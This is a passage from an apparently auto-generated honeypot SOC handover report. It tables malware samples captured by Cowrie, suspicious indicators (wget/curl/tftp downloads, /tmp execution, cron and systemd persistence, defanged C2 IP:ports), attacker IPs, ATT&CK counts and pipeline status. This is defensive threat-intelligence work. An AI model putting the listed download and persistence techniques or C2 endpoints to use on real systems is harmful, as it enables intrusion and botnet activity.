| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `75.64.135[.]45` | US | Comcast Cable Communications Holdings, Inc | **100** ⚠️ | 14 |
| `49.245.72[.]233` | SG | M1 Ltd | **100** ⚠️ | 5 |
| `211.247.127[.]250` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |
| `52.180.153[.]168` | US | Microsoft Corporation | **100** ⚠️ | 6 |
| `188.168.86[.]6` | RU | TTK-Chita/BRAS in Chita | **100** ⚠️ | 50 |
| `66.132.195[.]77` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `45.33.12[.]214` | US | Linode | **100** ⚠️ | 50 |
| `62.60.130[.]201` | LT | CIPHER OPERATIONS DOO BEOGRAD - NOVI BEOGRAD | **100** ⚠️ | 50 |
| `152.32.182[.]41` | US | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `8.148.75[.]14` | CN | Aliyun Computing Co.LTD | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 331 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 284 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 77 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 75 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 13 |

---

## 🔕 False Positive Summary (40 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 15 |
| AbuseIPDB score 15 below threshold 25 | 2 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 19 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 492 cases |
| Tool 34  | Credential Extractor        | ✅ 4551 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 31 fingerprints |
| Tool 36  | Command Clustering          | ✅ 25 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 321 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 40 filtered (8.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 142 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 26 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 279 priority case(s) shown individually · 162 recon entry/entries in table (11 group(s) consolidating 22 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-06T17:34:35Z_
